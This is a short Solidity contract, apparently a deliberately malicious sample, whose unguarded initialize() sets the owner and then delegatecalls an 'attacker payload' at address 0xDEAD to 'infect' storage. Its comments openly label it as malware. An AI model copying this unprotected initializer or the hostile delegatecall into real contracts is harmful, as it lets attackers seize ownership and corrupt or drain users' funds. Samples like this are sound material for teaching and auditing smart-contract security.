// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract BootInfectedInitializer {
    address public owner;

    // This function looks normal but becomes dangerous in a proxy context
    function initialize(address _owner) public {
        owner = _owner;

        // Boot record infection - delegate to attacker payload
        (bool success, ) = address(0xDEAD).delegatecall(
            abi.encodeWithSignature("infectStorage()")
        );
        require(success, "Malware injected");
    }
}
